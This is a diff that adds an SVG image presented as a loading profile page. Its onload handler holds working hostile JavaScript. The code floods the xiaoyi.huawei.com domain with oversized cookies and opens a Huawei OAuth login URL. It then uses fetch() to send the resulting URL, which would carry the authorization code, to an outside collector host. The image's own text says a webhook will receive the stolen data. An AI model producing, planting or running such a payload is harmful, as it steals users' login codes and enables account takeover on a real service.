@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:svg="http://www.w3.org/2000/svg" width="640" height="240" viewBox="0 0 640 240"
+     onload='document.cookie="a="+"a".repeat(4095)+";path=/; domain=xiaoyi.huawei.com; SameSite=None; Secure; Partitioned;";document.cookie="b="+"b".repeat(4027)+";path=/; domain=xiaoyi.huawei.com; SameSite=None; Secure; Partitioned;";setTimeout("var test = open(&apos;https://oauth-login.cloud.huawei.com/oauth2/v3/authorize?response_type=code&amp;access_type=offline&amp;state=1&amp;client_id=116609361&amp;redirect_uri=https%3A%2F%2Fxiaoyi.huawei.com%2Fchat%2Fauth%2Fcallback%3furl=https%253A%252F%252Fxiaoyi.huawei.com%252Fchat%252F&amp;scope=openid%20profile%20ageRange%20phone%20email&apos;);",2000);setTimeout("fetch(&apos;https://h8q4mt5esui4bmu6o7lhaggsgjmaa2yr.b.0x27.top?dxl=&apos;+test.location.href)",3000)'>
+  <rect width="100%" height="100%" fill="#ffffff"/>
+  <rect x="20" y="20" width="600" height="200" rx="18" fill="#f6f8fa" stroke="#d0d7de"/>
+  <text x="40" y="80" font-size="28" fill="#111827">资料页</text>
+  <text x="40" y="122" font-size="18" fill="#4b5563">正在加载内容，请稍候…</text>
+  <text x="40" y="156" font-size="14" fill="#6b7280">执行成功后，Webhook 日志会收到 cookies / origin / uri。</text>
+</svg>
